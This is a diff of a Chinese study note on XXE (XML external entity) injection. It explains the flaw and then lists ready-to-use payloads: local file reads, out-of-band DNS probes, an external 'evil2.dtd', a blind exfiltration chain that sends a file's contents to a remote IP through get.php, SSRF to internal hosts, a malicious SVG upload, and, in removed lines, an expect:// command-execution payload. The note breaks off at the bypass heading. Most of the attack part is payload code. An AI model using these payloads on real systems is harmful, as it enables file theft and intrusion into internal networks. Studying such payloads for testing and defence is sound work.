@@ -1,6 +1,4 @@
-![image-20210830102020800](D:\BaiduNetdiskDownload\安全\XXE&XML之利用检测绕过\XXE&XML之利用检测绕过.assets\image-20210830102020800.png)
-
-
+# XML 外部实体 (XXE) 注入
 
 [CTF XXE - MustaphaMond - 博客园 (cnblogs.com)](https://www.cnblogs.com/20175211lyz/p/11413335.html)
 
@@ -18,71 +16,107 @@ XML被设计为传输和存储数据，其焦点是数据的内容。
 HTML被设计用来显示数据，其焦点是数据的外观。
 HTML旨在显示信息而XML旨在传输信息。
 
+## 漏洞原理：
+
+XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。
+
+## XXE 攻击有哪些类型？
+
+XXE 攻击有多种类型：
+
+- 利用 XXE 检索文件，其中定义了包含文件内容的外部实体，并在应用程序的响应中返回。
+- 利用 XXE 执行 SSRF 攻击，其中外部实体是基于后端系统的 URL 定义的。
+- 利用盲 XXE 带外泄露数据，其中敏感数据从应用程序服务器传输到攻击者控制的系统。
+- 利用盲 XXE 通过错误消息检索数据，攻击者可以在其中触发包含敏感数据的解析错误消息。
+
 ## 玩法
 
-```
-#读文件
-<?xml version = "1.0"?>
-<!DOCTYPE ANY [
-<!ENTITY xxe SYSTEM "file:///d://test.txt">
-]>
-<x>&xxe;</x>
+1、读取文件：
 
-#内网探针或攻击内网应用(触发漏洞地址)
-<?xml version="1.0" encoding="UTF-8"?>
-<! DOCTYPE foo [
-<! ELEMENT foo ANY >
-<! ENTITY rabbit SYSTEM "http://192.168.0.103:8081/index.txt"
->
-]>
-<x>&rabbit;</x>
-
-
-#RCE
-该cAsE是在安装e xpect扩展的PHp环境里执行系统命令
+```xml
 <?xml version="1.0"?>
-<!DOCTYPE ANY [
-<!ENTITY xxe SYSTEM "expect://id">
+
+<!DOCTYPE Mikasa [
+<!ENTITY test SYSTEM  "file:///d:/e.txt">
 ]>
-<x>&xxe;</x>
+<user><username>&test;</username><password>Mikasa</password></user>
 
 
 
-#引入外部实体dtd
+```
+
+1.1、带外测试：
+
+```xml
 <?xml version="1.0" ?>
+
 <!DOCTYPE test [
-<!ENTITY 8 file SYSTEM "http://127.0.0.1:8081/evil2. dtd">
+    <!ENTITY % file SYSTEM "http://9v57ll.dnslog.cn">
     %file;
 ]>
-<x>&send;</x>
+<user><username>&send;</username><password>Mikasa</password></user>
 
-evil2.dtd:
-<!ENTITY send SYSTEM "file:///d:/test.txt">
-
-
-#无回显-读取文件
-<?xm1 version="1.0"?>
-<IDOCTYPE test [
-<!ENTItY % file SYSTEM "php:// filter/read=convert.base64-encode/resource=d:/test.txt">
-<!ENTITY % dtd SYSTEM "http://192.168.0.103:8081/test.dtd">
-&dtd;
-&send;
-
-test.dtd:
-<!ENTity 8 payload
-	"<!ENTITY &#x25; send SYSTEM
-'http://192.168.0.103:8081/ ?data=sfile; '>"
-%payload;
-
-
-#协议-读文件(绕过)
-<?xml veraion = "1.0"2>
-<IDOCTYPE ANY [ < !ENTITY f SYSTEM
-"php://filter/read=convert.base64-encode/resource=xxe.php">
-]>
-<x>&f;</x>
 
 ```
+
+2、外部引用实体dtd：
+
+```xml
+<?xml version="1.0" ?>
+
+<!DOCTYPE test [
+    <!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd">
+    %file;
+]>
+<user><username>&send;</username><password>Mikasa</password></user>
+
+
+evil2.dtd：
+
+<!ENTITY send SYSTEM "file:///d:/e.txt">
+```
+
+3、无回显读文件
+
+```xml
+<?xml version="1.0"?>
+
+<!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "file:///d:/e.txt">
+<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">
+%remote;
+%all;
+]>
+<root>&send;</root>
+test.dtd
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">
+
+
+```
+
+4、利用 XXE 执行 SSRF 攻击
+除了检索敏感数据外，XXE 攻击的另一个主要影响是它们可用于执行服务器端请求伪造 (SSRF)。这是一个潜在的严重漏洞，可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。
+在以下 XXE 示例中，外部实体将导致服务器向组织基础设施内的内部系统发出后端 HTTP 请求：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+```
+
+5、通过文件上传进行 XXE 攻击
+一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例是办公文档格式（如 DOCX）和图像格式（如 SVG）。
+例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收 PNG 或 JPEG 等格式，正在使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面
+例如：使用以下内容创建本地 SVG 图像：
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ 
+	<!ENTITY xxe SYSTEM "file:///etc/hostname" > 
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+在博客文章上发表评论，并将此图片作为头像上传。
+当您查看评论时，您应该会在图像中看到/etc/hostname文件的内容。
 
 ## 绕过方式
 
